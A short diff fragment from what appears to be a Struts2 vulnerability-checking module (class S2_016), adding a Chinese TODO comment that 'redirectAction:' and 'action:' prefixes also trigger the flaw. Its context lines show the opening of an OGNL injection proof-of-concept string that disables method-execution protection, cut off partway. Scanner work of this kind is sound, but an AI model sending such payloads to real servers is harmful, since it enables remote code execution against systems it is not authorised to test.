@@ -9,6 +9,8 @@ public class S2_016 extends IModule {
     public String randomMark = Util.getRandomString(16);
     public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
 
+    // TODO
+    //redirectAction:和action: 也可触发漏洞
     public String poc =
             "redirect:${" +
             "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
